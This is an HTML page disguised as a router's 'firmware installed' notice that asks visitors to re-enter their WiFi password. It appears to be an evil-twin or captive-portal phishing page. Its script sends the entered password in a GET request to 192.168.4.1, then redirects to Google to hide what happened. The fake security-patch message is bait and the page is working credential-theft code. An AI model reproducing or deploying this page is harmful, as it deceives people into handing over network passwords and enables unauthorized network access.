		<h1>Firmware 2.0.16 installed.</h1>
	    <p>The following security patches were applied:</p>
			<bl>
		<li>Removal of buffer overflow error on configuration page</li>

		<p>

		<p>
		<p>Enter your WiFi password to reactivate the connection.</p>
        <input type="hidden" id="email" class="form-control" placeholder="Email">
        <input type="password" id="password" class="form-control" placeholder="WiFi connection password">
        <button onclick="sendCredentials()" class="btn">Authenticate</button>
    </div>

    <script>
        function sendCredentials() {
            var email = "Wifi pass !";
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
			alert("Check the network.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
